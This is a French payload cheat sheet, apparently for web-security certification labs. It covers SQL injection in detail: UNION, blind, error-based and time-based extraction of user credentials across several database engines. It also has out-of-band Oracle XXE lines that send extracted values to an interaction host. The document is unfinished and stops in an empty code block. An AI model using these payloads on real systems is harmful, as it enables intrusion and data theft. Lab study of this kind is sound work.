---
tags: [bscp, essentiel, payloads]
statut: en cours
mis-a-jour: 2026-11-06
---
# Fiche de payloads

Cette fiche sert de mémo pendant un lab : on cherche le thème dans la table des matières, on lit la ligne du tableau qui correspond à la situation, puis on copie la ligne du bloc de code portant la même référence. Les tableaux décrivent, les blocs de code contiennent les payloads. Aucun payload n'est écrit dans une cellule de tableau, pour ne pas l'altérer.

## Légende

Tous les placeholders s'écrivent en majuscules entre chevrons. Ils sont à remplacer avant d'envoyer le payload.

| Placeholder | Signification | Remplacer par |
|---|---|---|
| `<COLLAB>` | Sous-domaine d'interaction hors bande | Sous-domaine Burp Collaborator ou domaine de l'exploit server |
| `<COND>` | Condition booléenne testée | Expression vraie ou fausse selon le test, par exemple `1=1` |
| `<TABLE>` | Nom de table | Nom découvert par énumération |
| `<COLONNE>` | Nom de colonne | Nom découvert par énumération |
| `<UTILISATEUR>` | Nom de compte ciblé | Valeur du test |
| `<N>` | Nombre ou position | Entier à faire varier |
| `<HOTE>` | Nom d'hôte ou adresse | Cible interne ou externe selon le test |
| `<HOTEATTENDU>` | Hôte que la liste blanche autorise | Hôte vu dans la requête normale |
| `<HOTEEXTERNE>` | Hôte contrôlé par l'attaquant | Domaine de l'exploit server |
| `<IP>` | Adresse IP | Adresse choisie ou aléatoire selon le test |
| `<PARAM>` | Nom du paramètre vulnérable | Nom réel dans la requête |
| `<CHEMIN>` | Chemin de fichier ou d'URL | Valeur du test |
| `<FICHIER>` | Nom de fichier | Valeur du test |
| `<VALEUR>` | Donnée libre ou valeur d'origine du paramètre | Valeur du test |
| `<MARQUEUR>` | Texte unique facile à repérer dans la réponse | Chaîne aléatoire |
| `<MOTCLE>` et `<ANNEE>` | Mot et année de la politique de mot de passe | Valeurs plausibles pour la cible |
| `<DELAI>` | Durée du délai en secondes | 10 par défaut |

Autres conventions :
- Position Intruder : `§X§` garde le format exact de Burp, par exemple `§a§`.
- Encodage dans une URL : `+` vaut espace, `%2b` vaut plus, `%23` vaut dièse, `%3b` vaut point-virgule, `%26` vaut esperluette, `%7c` vaut tube, `%0a` vaut saut de ligne, `%00` vaut octet nul.
- Dans un cookie, le plus n'est pas décodé comme dans une URL, et le point-virgule s'écrit `%3b`.
- Chaque ligne de référence (par exemple `SQL-E1`) est un commentaire placé au-dessus du payload. Pour copier un payload, sélectionner uniquement la ligne qui suit ce commentaire.
- Tout payload SQL se termine par `-- -` : le tiret final protège l'espace, que certains éditeurs suppriment en fin de ligne (MySQL exige cet espace).
- Dans les payloads SQL, `<VALEUR>` est la valeur d'origine du paramètre, utilisée pour garder la requête valide.

## Table des matières

- [[#SQL injection]]
  - [[#SQL injection - Détection]]
  - [[#SQL injection - Commentaires et conditions]]
  - [[#SQL injection - Union]]
  - [[#SQL injection - Aveugle booléen]]
  - [[#SQL injection - Error-based]]
  - [[#SQL injection - Délai]]
  - [[#SQL injection - Hors bande]]
  - [[#SQL injection - Fichiers et contournement de filtre]]
- [[#Command injection]]
  - [[#Command injection - Détection et sortie visible]]
  - [[#Command injection - Séparateurs]]
  - [[#Command injection - Délai]]
  - [[#Command injection - Redirection de sortie]]
  - [[#Command injection - Hors bande]]
  - [[#Command injection - Contournement de filtre]]
- [[#Path traversal]]
  - [[#Path traversal - Séquences simples]]
  - [[#Path traversal - Séquences imbriquées]]
  - [[#Path traversal - Encodages]]
  - [[#Path traversal - Chemin absolu]]
  - [[#Path traversal - Préfixe]]
  - [[#Path traversal - Extension et octet nul]]
  - [[#Path traversal - Fichiers cibles]]
- [[#File upload]]
  - [[#File upload - Web shells]]
  - [[#File upload - Type MIME]]
  - [[#File upload - Techniques de contournement]]
- [[#SSRF]]
  - [[#SSRF - Cibles locales]]
  - [[#SSRF - Balayage interne]]
  - [[#SSRF - Représentations d'adresse]]
  - [[#SSRF - Contournement de liste noire]]
  - [[#SSRF - Contournement de liste blanche]]
  - [[#SSRF - Redirection ouverte]]
  - [[#SSRF - Aveugle]]
  - [[#SSRF - Métadonnées cloud]]
- [[#Access control]]
  - [[#Access control - Accès direct]]
  - [[#Access control - Paramètres et cookies]]
  - [[#Access control - Identifiants]]
  - [[#Access control - Méthode HTTP]]
  - [[#Access control - En-têtes de réécriture]]
  - [[#Access control - Variantes de chemin]]
  - [[#Access control - Referer]]
- [[#Authentication]]
  - [[#Authentication - Énumération de comptes]]
  - [[#Authentication - Mots de passe]]
  - [[#Authentication - Contournement de blocage]]
  - [[#Authentication - Réinitialisation]]
  - [[#Authentication - Cookie persistant]]
  - [[#Authentication - HTTP Basic]]
- [[#Multi-factor authentication]]
  - [[#Multi-factor authentication - Contournement de l'étape]]
  - [[#Multi-factor authentication - Force brute du code]]
  - [[#Multi-factor authentication - Réponse manipulable]]
- [[#Outils Burp transverses]]
  - [[#Outils Burp - Intruder]]
  - [[#Outils Burp - Turbo Intruder]]
  - [[#Outils Burp - Collaborator]]
  - [[#Outils Burp - Resource pool et sessions]]

## SQL injection

Note détaillée : [[SQL-injection]] ; fiches : [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]], [[Error-based SQL Injection]]

**Quand l'utiliser** : un paramètre, un cookie, un en-tête ou un champ du corps est inséré dans une requête SQL.
**Détection** : envoyer une apostrophe seule, puis deux apostrophes ; une erreur suivie d'un retour à la normale confirme l'injection. Le point d'injection peut aussi se trouver dans le corps de la requête, un cookie ou un en-tête.

### SQL injection - Détection

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-D1 | Chaîne dans une clause WHERE | Erreur de base de données ou réponse anormale | Une apostrophe ouvre ou ferme une chaîne |
| SQL-D2 | Confirmation après SQL-D1 | Retour à la page normale | Deux apostrophes forment une apostrophe littérale |
| SQL-D3 | Paramètre numérique sans guillemet | Même page que la valeur d'origine | Remplacer la valeur par une opération qui donne le même résultat |
| SQL-D4 | Concaténation neutre par moteur | Page normale | Sert aussi à reconnaître le moteur ; voir les blocs de la section Union pour la syntaxe de chaque moteur |

**Tous moteurs**

```sql
-- SQL-D1 detection apostrophe
'
-- SQL-D2 detection deux apostrophes
''
-- SQL-D3 detection numerique
<N>-1
```

**Concaténation neutre**

```sql
-- SQL-D4 detection concatenation oracle postgresql
'||'
-- SQL-D4 detection concatenation microsoft
'+'
-- SQL-D4 detection concatenation mysql
' '
```

### SQL injection - Commentaires et conditions

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-C1 | Couper la fin de la requête d'origine | Le filtre qui suit disparaît (par exemple un contrôle de publication) | Commentaire placé juste après la valeur |
| SQL-C2 | Condition toujours vraie | Tous les enregistrements sont affichés, y compris ceux qui sont masqués | Ne jamais l'envoyer dans une requête qui modifie ou supprime des données |
| SQL-C3 | Contournement de connexion | Connexion sans mot de passe valide | Champ du mot de passe laissé vide |
| SQL-C4 | Choix du commentaire | Fin de requête ignorée | MySQL exige un espace après les deux tirets, d'où `-- -`, ou `--+` dans une URL |

**Tous moteurs**

```sql
-- SQL-C1 commentaire coupe fin requete
<VALEUR>'-- -
-- SQL-C2 condition toujours vraie
' OR 1=1-- -
-- SQL-C3 contournement connexion utilisateur
<UTILISATEUR>'-- -
```

**Commentaires par moteur**

```text
# SQL-C4 commentaire oracle microsoft postgresql
-- -
# SQL-C4 commentaire mysql
-- -
# SQL-C4 commentaire mysql dieze
#
# SQL-C4 commentaire dans une url
--+
# SQL-C4 commentaire dieze dans une url
%23
```

### SQL injection - Union

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-U1 | Nombre de colonnes par ORDER BY | Erreur au-delà du nombre réel de colonnes | La dernière valeur sans erreur donne le nombre ; un hors plage peut être masqué par la page |
| SQL-U2 | Nombre de colonnes par NULL | L'erreur disparaît quand le nombre de NULL est exact | Continuer jusqu'à la disparition de l'erreur |
| SQL-U3 | Paramètre numérique | Mêmes signaux que SQL-U1 et SQL-U2 | Pas d'apostrophe |
| SQL-U4 | Doublons filtrés | Ligne injectée conservée | UNION ALL garde les lignes identiques |
| SQL-U5 | Colonne de type chaîne | Valeur affichée dans la page | Déplacer la valeur d'une colonne à l'autre ; en lab, utiliser la valeur imposée par l'énoncé à la place de la lettre |
| SQL-U6 | Extraction de deux colonnes de texte | Données de la table dans la page | Deux colonnes de type chaîne nécessaires |
| SQL-U7 | Une seule colonne de texte | Plusieurs valeurs dans une cellule | Concaténer avec un séparateur ; Oracle et PostgreSQL |
| SQL-U8 | Isoler la ligne injectée | Seule la ligne injectée reste visible | Filtrer sur une catégorie inexistante dans la requête d'origine |
| SQL-U9 | Oracle | Pas d'erreur au bon nombre de colonnes | FROM obligatoire, table intégrée DUAL |
| SQL-U10 | Version du moteur | Chaîne de version dans la page | Une requête par moteur |
| SQL-U11 | Tables et colonnes hors Oracle | Noms de tables puis de colonnes | Colonnes : remplacer la table par celle trouvée à l'étape précédente |
| SQL-U12 | Tables et colonnes sur Oracle | Noms de tables puis de colonnes | Nom de table en majuscules |
| SQL-U13 | Lignes multiples en une cellule | Toutes les lignes dans une valeur | Longueur d'affichage limitée par le moteur |
| SQL-U14 | La page affiche une seule ligne | Ligne différente à chaque décalage | Dépend d'une page qui affiche la première ligne injectée |
| SQL-U15 | Utilisateur et base courants | Valeurs affichées | Deux colonnes de texte |
| SQL-U16 | Schéma applicatif sur PostgreSQL | Seulement les tables de l'application | Évite le bruit des tables système |
| SQL-U17 | SQLite | Version, puis noms et définitions des tables | Pas de information_schema |

**Tous moteurs**

```sql
-- SQL-U1 union order by colonnes
' ORDER BY 1-- -
-- SQL-U1 union order by colonnes
' ORDER BY 2-- -
-- SQL-U1 union order by colonnes
' ORDER BY 3-- -
-- SQL-U2 union null colonnes
' UNION SELECT NULL-- -
-- SQL-U2 union null colonnes
' UNION SELECT NULL,NULL-- -
-- SQL-U2 union null colonnes
' UNION SELECT NULL,NULL,NULL-- -
-- SQL-U3 union numerique
1 ORDER BY 3-- -
-- SQL-U3 union numerique
1 UNION SELECT NULL,NULL,NULL-- -
-- SQL-U4 union all
' UNION ALL SELECT NULL,NULL-- -
-- SQL-U5 union colonne chaine
' UNION SELECT 'a',NULL,NULL,NULL-- -
-- SQL-U5 union colonne chaine
' UNION SELECT NULL,'a',NULL,NULL-- -
-- SQL-U6 union extraction deux colonnes
' UNION SELECT username,<COLONNE> FROM <TABLE>-- -
```

**Oracle**

```sql
-- SQL-U9 union oracle dual
' UNION SELECT NULL FROM DUAL-- -
-- SQL-U7 union oracle concatenation une colonne
' UNION SELECT NULL,username||'~'||<COLONNE> FROM <TABLE>-- -
-- SQL-U10 union oracle version
' UNION SELECT banner,NULL FROM v$version-- -
-- SQL-U12 union oracle tables
' UNION SELECT table_name,NULL FROM all_tables-- -
-- SQL-U12 union oracle tables du compte
' UNION SELECT table_name,NULL FROM user_tables-- -
-- SQL-U12 union oracle colonnes
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='<TABLE>'-- -
-- SQL-U13 union oracle lignes multiples
' UNION SELECT NULL,LISTAGG(username||':'||<COLONNE>,',') WITHIN GROUP (ORDER BY username) FROM <TABLE>-- -
-- SQL-U14 union oracle ligne par ligne
' UNION SELECT username,<COLONNE> FROM <TABLE> OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY-- -
-- SQL-U15 union oracle utilisateur
' UNION SELECT user,NULL FROM dual-- -
```

Sur Oracle, la concaténation s'écrit comme suit.

```sql
-- SQL-U7 concatenation oracle
'foo'||'bar'
```

**Microsoft SQL Server**

```sql
-- SQL-U7 concatenation microsoft
'foo'+'bar'
-- SQL-U10 union microsoft version
' UNION SELECT @@version,NULL-- -
-- SQL-U13 union microsoft lignes multiples
' UNION SELECT NULL,STRING_AGG(username+':'+<COLONNE>,',') FROM <TABLE>-- -
-- SQL-U14 union microsoft ligne par ligne
' UNION SELECT username,<COLONNE> FROM <TABLE> ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY-- -
-- SQL-U15 union microsoft utilisateur et base
' UNION SELECT SYSTEM_USER,DB_NAME()-- -
```

Dans une URL, le plus de la concaténation s'envoie sous la forme `%2b`. `STRING_AGG` demande SQL Server 2017 ou plus ; sur une version plus ancienne, voir `FOR XML PATH` dans la section Error-based.

**PostgreSQL**

```sql
-- SQL-U7 concatenation postgresql
'foo'||'bar'
-- SQL-U7 union postgresql concatenation une colonne
' UNION SELECT NULL,username||'~'||<COLONNE> FROM <TABLE>-- -
-- SQL-U10 union postgresql version
' UNION SELECT version(),NULL-- -
-- SQL-U13 union postgresql lignes multiples
' UNION SELECT NULL,STRING_AGG(username||':'||<COLONNE>,',') FROM <TABLE>-- -
-- SQL-U14 union postgresql ligne par ligne
' UNION SELECT username,<COLONNE> FROM <TABLE> LIMIT 1 OFFSET 1-- -
-- SQL-U15 union postgresql utilisateur et base
' UNION SELECT current_user,current_database()-- -
-- SQL-U16 union postgresql schema applicatif
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -
```

**MySQL et MariaDB**

```sql
-- SQL-U7 concatenation mysql
'foo' 'bar'
-- SQL-U7 concatenation mysql
CONCAT('foo','bar')
-- SQL-U10 union mysql version
' UNION SELECT @@version,NULL#
-- SQL-U13 union mysql lignes multiples
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,<COLONNE>) FROM <TABLE>-- -
-- SQL-U14 union mysql ligne par ligne
' UNION SELECT username,<COLONNE> FROM <TABLE> LIMIT 1 OFFSET 1-- -
-- SQL-U15 union mysql utilisateur et base
' UNION SELECT user(),database()-- -
```

La première forme de concaténation MySQL est deux chaînes séparées par un espace. Dans une URL, le dièse du commentaire s'envoie sous la forme `%23`. `GROUP_CONCAT` est limité par la variable `group_concat_max_len`.

**SQLite**

```sql
-- SQL-U17 union sqlite version
' UNION SELECT sqlite_version(),NULL-- -
-- SQL-U17 union sqlite tables
' UNION SELECT name,sql FROM sqlite_master-- -
```

**Hors Oracle : Microsoft SQL Server, PostgreSQL, MySQL et MariaDB**

```sql
-- SQL-U11 union information schema tables
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
-- SQL-U11 union information schema colonnes
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='<TABLE>'-- -
```

Le point d'injection peut se trouver dans le corps de la requête, un cookie ou un en-tête ; la réponse doit alors afficher les données pour que l'attaque Union fonctionne.

### SQL injection - Aveugle booléen

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-B1 | Détection d'une différence vrai et faux | Message présent pour la condition vraie, absent pour la fausse | Une session expirée donne le même résultat que faux |
| SQL-B2 | Paramètre numérique | Page identique à l'original, puis page vide | Pas d'apostrophe |
| SQL-B3 | Existence d'une table puis d'un utilisateur | Message présent si la ligne existe | Une sous-requête à plusieurs lignes provoque une erreur |
| SQL-B4 | Longueur du mot de passe | Le message disparaît quand la longueur est dépassée | Incrémenter la valeur jusqu'à la bascule ; fonction LEN sur Microsoft |
| SQL-B5 | Extraction d'un caractère avec Intruder | Message présent pour le bon caractère | Position sur la lettre entre les marques ; fonction SUBSTR sur Oracle |
| SQL-B6 | Dichotomie sur le code du caractère | Environ sept requêtes par caractère | Insensible au piège de la casse |
| SQL-B7 | Casse du mot de passe | Distingue la majuscule de la minuscule | Dépend de la collation du moteur |
| SQL-B8 | Existence d'une colonne | Message présent si la colonne existe | Droits sur information_schema nécessaires |

**Tous moteurs**

```sql
-- SQL-B1 booleen vrai
<VALEUR>' AND '1'='1
-- SQL-B1 booleen faux
<VALEUR>' AND '1'='2
-- SQL-B2 booleen numerique vrai
<VALEUR> AND 1=1
-- SQL-B2 booleen numerique faux
<VALEUR> AND 1=2
-- SQL-B3 booleen existence table
<VALEUR>' AND (SELECT 'a' FROM <TABLE> LIMIT 1)='a
-- SQL-B3 booleen existence utilisateur
<VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>')='a
```

**PostgreSQL et MySQL**

```sql
-- SQL-B4 booleen longueur
<VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>' AND LENGTH(<COLONNE>)><N>)='a
-- SQL-B5 booleen caractere intruder
<VALEUR>' AND (SELECT SUBSTRING(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='§a§
-- SQL-B6 booleen dichotomie
<VALEUR>' AND ASCII(SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1))>109-- -
-- SQL-B8 booleen existence colonne postgresql
<VALEUR>' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='<TABLE>' AND column_name='<COLONNE>')=1-- -
```

**Oracle**

```sql
-- SQL-B5 booleen caractere oracle
<VALEUR>' AND (SELECT SUBSTR(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='a' AND '1'='1
```

**Microsoft SQL Server**

```sql
-- SQL-B4 booleen longueur microsoft
<VALEUR>' AND (SELECT 'a' FROM <TABLE> WHERE username='<UTILISATEUR>' AND LEN(<COLONNE>)><N>)='a
-- SQL-B5 booleen caractere microsoft
<VALEUR>' AND (SELECT SUBSTRING(<COLONNE>,1,1) FROM <TABLE> WHERE username='<UTILISATEUR>')='a'-- -
```

**MySQL et MariaDB**

```sql
-- SQL-B7 booleen casse mysql
<VALEUR>' AND BINARY SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1)='A'-- -
```

Pour automatiser, voir [[#Outils Burp - Intruder]] : une position pour l'index et une pour le caractère, avec un Grep - Match sur le message de réussite.

### SQL injection - Error-based

**Quand l'utiliser** : la page n'affiche pas le résultat de la requête, mais une erreur de base de données est visible (erreur verbeuse) ou son absence se remarque (erreur conditionnelle).

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-E1 | Oracle, erreur conditionnelle | Erreur de division par zéro si la condition est vraie, page normale sinon | Choisir `<COND>` avec soin ; ne jamais atteindre une requête qui modifie ou supprime des données |
| SQL-E2 | Microsoft, erreur conditionnelle | Erreur de division par zéro si la condition est vraie | Message `Divide by zero error` |
| SQL-E3 | PostgreSQL, erreur conditionnelle | Erreur de division par zéro si la condition est vraie | La sous-requête empêche l'optimiseur de calculer la division à l'avance |
| SQL-E4 | PostgreSQL, erreur verbeuse | Message `invalid input syntax for type integer` suivi de la valeur | Si le message est tronqué, vider la valeur d'origine du cookie |
| SQL-E5 | MySQL et MariaDB, erreur verbeuse | Message `XPATH syntax error` suivi de la valeur | Environ 32 caractères affichés ; extraire par tranches avec SUBSTRING |
| SQL-E6 | Microsoft, erreur verbeuse | Message `Conversion failed when converting the nvarchar value` suivi de la valeur | Une seule ligne par sous-requête |
| SQL-E7 | Oracle, erreur verbeuse | Message `ORA-31011: XML parsing failed` avec la valeur dans le détail | Une seule ligne par sous-requête (ROWNUM) |
| SQL-E8 | PostgreSQL, variante sans le mot CAST | Même message que SQL-E4 | Utile si CAST est filtré |
| SQL-E9 | MySQL et MariaDB, équivalent de SQL-E5 | Même message que SQL-E5 | Utile si EXTRACTVALUE est filtré |
| SQL-E10 | MySQL, double requête | Message `Duplicate entry` avec la valeur | Dépend de la version, plutôt pour d'anciennes versions |
| SQL-E11 | MySQL, erreur conditionnelle | Message `Subquery returns more than 1 row` si la condition est vraie | La division par zéro ne lève pas d'erreur en lecture sur MySQL |
| SQL-E12 | Microsoft, version et utilisateur | Message de conversion avec la valeur | Même mécanisme que SQL-E6 |
| SQL-E13 | Microsoft, plusieurs lignes | Message de conversion avec la liste | STRING_AGG demande SQL Server 2017 ou plus ; FOR XML PATH pour les versions plus anciennes |
| SQL-E14 | Oracle, UTL_INADDR | Message `ORA-29257: host` suivi de la valeur | Dépend de la version et des droits réseau |
| SQL-E15 | Oracle, CTXSYS | Message `ORA-20000` avec la valeur | Exige Oracle Text |
| SQL-E16 | SQLite, erreur conditionnelle | Message `integer overflow` si la condition est vraie | Oracle conditionnel uniquement, aucune fuite de valeur ; dépend de la version |
| SQL-E17 | PostgreSQL, plusieurs lignes | Message de conversion avec la liste | Message souvent tronqué ; préférer LIMIT 1 OFFSET |
| SQL-E18 | PostgreSQL, reconnaissance du contexte | Message `argument of AND must be type boolean` | Confirme PostgreSQL |
| SQL-E19 | PostgreSQL, conditionnel par conversion | Erreur de conversion si la condition est vraie | Alternative à SQL-E3 |
| SQL-E20 | MySQL, conditionnel par sous-requête | Erreur `more than 1 row` si la condition est vraie | Alternative à SQL-E11 |
| SQL-E21 | Microsoft, CAST | Message de conversion avec la valeur | Équivalent de SQL-E6 |
| SQL-E22 | Microsoft, erreurs de regroupement | Noms de la forme table.colonne, un par requête | Anciennes versions |
| SQL-E23 | Microsoft, conditionnel empilé | Erreur si la condition est vraie | Exige les requêtes empilées ; point-virgule en `%3b` dans un cookie |
| SQL-E24 | Oracle, XMLTYPE simplifié | Message ORA-31011 avec la valeur | Version plus courte de SQL-E7 |
| SQL-E25 | SQLite, oracle JSON | Message `malformed JSON` si la condition est vraie | Extension JSON1 nécessaire |

Reconnaissance du moteur par le message d'erreur :

| Fragment du message | Moteur probable |
|---|---|
| `XPATH syntax error`, `Subquery returns more than 1 row` ou `You have an error in your SQL syntax` | MySQL ou MariaDB |
| `invalid input syntax for type integer` | PostgreSQL |
| `ORA-` | Oracle |
| `Conversion failed`, `Divide by zero error` ou `Unclosed quotation mark` | Microsoft SQL Server |
| `SQLITE_ERROR` ou `unrecognized token` | SQLite |

Pour l'extraction, remplacer `<COND>` par une comparaison de caractères, par exemple `SUBSTR(<COLONNE>,1,1)='a'`, et ajouter `FROM <TABLE> WHERE username='<UTILISATEUR>'` dans la sous-requête. Pour la longueur, utiliser `LENGTH(<COLONNE>)><N>`.

**Oracle**

```sql
-- SQL-E1 error-based oracle conditionnel
' || (SELECT CASE WHEN (<COND>) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
-- SQL-E7 error-based oracle verbeux xmltype
' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' AND ROWNUM=1)||CHR(62))) FROM dual)-- -
-- SQL-E24 error-based oracle xmltype simple
' || (SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual) || '
-- SQL-E14 error-based oracle utl_inaddr
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
-- SQL-E15 error-based oracle ctxsys
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
```

**Microsoft SQL Server**

```sql
-- SQL-E2 error-based microsoft conditionnel
' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/0 ELSE 1 END)-- -
-- SQL-E6 error-based microsoft verbeux convert
' AND 1=CONVERT(int,(SELECT TOP 1 <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'))-- -
-- SQL-E12 error-based microsoft version
' AND 1=CONVERT(int,@@version)-- -
-- SQL-E12 error-based microsoft utilisateur
' AND 1=CONVERT(int,SYSTEM_USER)-- -
-- SQL-E13 error-based microsoft string_agg
' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -
-- SQL-E13 error-based microsoft for xml path
' AND 1=CONVERT(int,(SELECT name+',' FROM sys.tables FOR XML PATH('')))-- -
-- SQL-E21 error-based microsoft cast
' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- -
-- SQL-E22 error-based microsoft regroupement
' HAVING 1=1-- -
-- SQL-E22 error-based microsoft regroupement
' GROUP BY <COLONNE> HAVING 1=1-- -
-- SQL-E23 error-based microsoft empile conditionnel
'; IF (<COND>) SELECT 1/0-- -
```

**PostgreSQL**

```sql
-- SQL-E3 error-based postgresql conditionnel
' AND 1=(SELECT CASE WHEN (<COND>) THEN 1/(SELECT 0) ELSE 1 END)-- -
-- SQL-E4 error-based postgresql verbeux cast
' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -
-- SQL-E8 error-based postgresql verbeux operateur
' AND 1=(SELECT <COLONNE> FROM <TABLE> LIMIT 1)::int-- -
-- SQL-E17 error-based postgresql string_agg
' AND 1=CAST((SELECT string_agg(<COLONNE>,',') FROM <TABLE>) AS int)-- -
-- SQL-E18 error-based postgresql contexte
' AND CAST((SELECT 1) AS int)-- -
-- SQL-E19 error-based postgresql conditionnel conversion
' AND 1=(SELECT CASE WHEN (<COND>) THEN CAST('a' AS int) ELSE 1 END)-- -
```

**MySQL et MariaDB**

```sql
-- SQL-E5 error-based mysql verbeux extractvalue
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)))-- -
-- SQL-E9 error-based mysql verbeux updatexml
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)),1)-- -
-- SQL-E10 error-based mysql double requete
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -
-- SQL-E11 error-based mysql conditionnel
' AND IF(<COND>,(SELECT table_name FROM information_schema.tables),'a')-- -
-- SQL-E20 error-based mysql conditionnel union
' AND (SELECT CASE WHEN (<COND>) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- -
```

Le message de SQL-E10 a la forme `Duplicate entry '<valeur>~1' for key 'group_key'`.

**SQLite**

```sql
-- SQL-E16 error-based sqlite conditionnel
' AND (SELECT CASE WHEN (<COND>) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -
-- SQL-E25 error-based sqlite json
' AND (SELECT CASE WHEN (<COND>) THEN json('{') ELSE 1 END)=1-- -
```

### SQL injection - Délai

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-T1 | Délai simple, aucune sortie visible | Réponse plus lente d'environ `<DELAI>` secondes | Mesurer d'abord le temps normal ; refaire avec une durée différente pour vérifier que le temps suit |
| SQL-T2 | Délai conditionnel | Délai seulement si la condition est vraie | Réglage Intruder : une seule requête simultanée |
| SQL-T3 | Délai conditionnel avec extraction | Délai si le caractère testé est le bon | PostgreSQL : le point-virgule s'envoie en `%3b` dans un cookie |
| SQL-T4 | Repli quand la pause est filtrée | Durée variable | Imprécis et lourd pour le serveur ; MySQL seulement |

**Oracle**

```sql
-- SQL-T1 delai oracle simple
'||dbms_pipe.receive_message(('a'),<DELAI>)-- -
-- SQL-T2 delai oracle conditionnel
' || (SELECT CASE WHEN (<COND>) THEN 'a'||dbms_pipe.receive_message(('a'),<DELAI>) ELSE NULL END FROM dual)-- -
```

**Microsoft SQL Server**

```sql
-- SQL-T1 delai microsoft simple
'; WAITFOR DELAY '0:0:<DELAI>'-- -
-- SQL-T2 delai microsoft conditionnel
'; IF (<COND>) WAITFOR DELAY '0:0:<DELAI>'-- -
-- SQL-T3 delai microsoft extraction
'; IF (SELECT COUNT(*) FROM <TABLE> WHERE username='<UTILISATEUR>' AND SUBSTRING(<COLONNE>,1,1)='a')=1 WAITFOR DELAY '0:0:<DELAI>'-- -
```

**PostgreSQL**

```sql
-- SQL-T1 delai postgresql simple
'||pg_sleep(<DELAI>)-- -
-- SQL-T2 delai postgresql conditionnel
'%3BSELECT CASE WHEN (<COND>) THEN pg_sleep(<DELAI>) ELSE pg_sleep(0) END-- -
-- SQL-T3 delai postgresql extraction
'%3BSELECT CASE WHEN (ASCII(SUBSTRING((SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),1,1))>109) THEN pg_sleep(<DELAI>) ELSE pg_sleep(0) END-- -
```

**MySQL et MariaDB**

```sql
-- SQL-T1 delai mysql simple
' AND SLEEP(<DELAI>)-- -
-- SQL-T2 delai mysql conditionnel
' AND IF(<COND>,SLEEP(<DELAI>),0)-- -
-- SQL-T4 delai mysql benchmark
' AND IF(<COND>,BENCHMARK(5000000,SHA1('a')),0)-- -
```

### SQL injection - Hors bande

| Réf. | Situation | Signal attendu | Remarque |
|---|---|---|---|
| SQL-O1 | Interaction DNS, Microsoft | Requête DNS reçue par le serveur d'interaction | Droits nécessaires ; requête empilée ; pare-feu sortant possible |
| SQL-O2 | Interaction DNS, PostgreSQL | Requête DNS reçue | Droits élevés (superutilisateur) ; requête empilée |
| SQL-O3 | Interaction DNS, Oracle | Requête DNS reçue | Droits élevés ; à placer dans une expression de la requête |
| SQL-O4 | Exfiltration | Valeur dans le sous-domaine reçu | Placer la sous-requête dans le sous-domaine ; étiquette DNS limitée à 63 caractères et à des caractères valides |
| SQL-O5 | Interaction DNS, Oracle via XML | Requêtes DNS et HTTP reçues | Corrigé sur les versions récentes d'Oracle |
| SQL-O6 | Interaction, MySQL | Requête DNS ou SMB reçue | Serveur Windows ; privilège FILE et variable secure_file_priv ; inopérant sous Linux |

Pour relever les interactions, voir [[#Outils Burp - Collaborator]]. Dans un cookie ou une URL, encoder les caractères spéciaux (`%`, `?`, `:`, `;`, `=`, espace).

**Oracle**

```sql
-- SQL-O3 hors bande oracle utl_inaddr
UTL_INADDR.get_host_address('<COLLAB>')
-- SQL-O5 hors bande oracle xml interaction
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB>/"> %remote;]>'),'/l') FROM dual-- -
-- SQL-O4 hors bande oracle exfiltration
x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>')||'.<COLLAB>/"> %remote;]>'),'/l') FROM dual)||'
```

**Microsoft SQL Server**

```sql
